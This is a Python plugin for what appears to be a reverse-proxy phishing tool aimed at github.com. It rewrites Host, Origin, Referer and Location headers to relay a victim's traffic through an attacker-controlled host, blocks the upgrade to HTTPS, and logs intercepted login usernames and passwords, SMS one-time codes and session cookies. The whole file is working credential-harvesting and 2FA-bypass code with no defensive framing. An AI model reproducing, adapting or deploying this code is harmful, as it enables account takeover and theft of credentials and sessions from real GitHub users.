import urllib.parse
from dataclasses import dataclass

# The hostname the client is sending requests to
actual_host: bytes = b""


# HTTP Request and response data class defnitions
@dataclass
class HttpRequest:
    method: bytes
    target: bytes
    headers: list[tuple[bytes, bytes]]
    body: bytes


@dataclass
class HttpResponse:
    status_code: int
    headers: list[tuple[bytes, bytes]]
    body: bytes


def modify_request(request: HttpRequest) -> HttpRequest:

    global actual_host

    # Get route
    log: str = ""  # Log
    log += "[plugins/github.com:modify_request] %s request for %s\n" % (
        request.method.decode(),
        request.target.decode(),
    )  # Log

    # Get username and password
    if request.target == b"/session" and request.method == b"POST":
        try:
            body = request.body.decode(errors="ignore")

            if "&login=" in body and "&password=" in body:
                username = body.split("&login=")[1].split("&")[0]
                username = urllib.parse.unquote(username)

                password = body.split("&password=")[1].split("&")[0]
                password = urllib.parse.unquote(password)

                log += (
                    "[plugins/github.com:modify_request] Found credentials -> %s:%s\n"
                    % (
                        username,
                        password,
                    )
                )
        except Exception:
            pass

    # Get SMS OTP code
    if request.target == b"/sessions/two-factor":
        try:
            body_parts = request.body.split(b"&")
            for part in body_parts:
                if b"otp" in part or b"code" in part:
                    sms_otp = part.split(b"=")[1]
                    log += (
                        "[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n"
                        % (sms_otp.decode(errors="ignore"))
                    )
                    break
        except Exception:
            pass

    # Get cookie values if requesting dashboard (means the user logged in succesfully)
    if request.target == b"/" or request.target == b"/dashboard":
        for header in request.headers:
            if header[0].decode().lower() == "cookie":
                _cookies = header[1].decode(errors="ignore").split(";")
                for _cookie in _cookies:
                    if _cookie.strip():
                        log += (
                            "[plugins/github.com:modify_request] Intercepted cookie -> %s\n"
                            % (_cookie.lstrip())
                        )

    print(log.strip())  # Log

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(request.headers)):
        key, value = request.headers[_hi]

        if key.lower() == b"host":
            if actual_host == b"":
                actual_host = value
            new_headers.append((key, b"github.com"))
            continue

        if key.lower() == b"origin":
            value = value.replace(actual_host, b"github.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        if key.lower() == b"referer":
            value = value.replace(actual_host, b"github.com")
            value = value.replace(b"http:", b"https:")
            new_headers.append((key, value))
            continue

        new_headers.append((key, value))

    request.headers = new_headers

    # Do not upgrade to HTTPS
    request.headers = [
        h for h in request.headers if h[0].lower() != b"upgrade-insecure-requests"
    ]

    print(request.headers)
    return request


def modify_response(response: HttpResponse) -> HttpResponse:

    # Modify headers
    new_headers: list[tuple[bytes, bytes]] = []

    for _hi in range(0, len(response.headers)):
        key, value = response.headers[_hi]

        if key.lower() == b"location":
            value = value.replace(b"github.com", actual_host)
            value = value.replace(b"https:", b"http:")

        new_headers.append((key, value))

    response.headers = new_headers

    return response
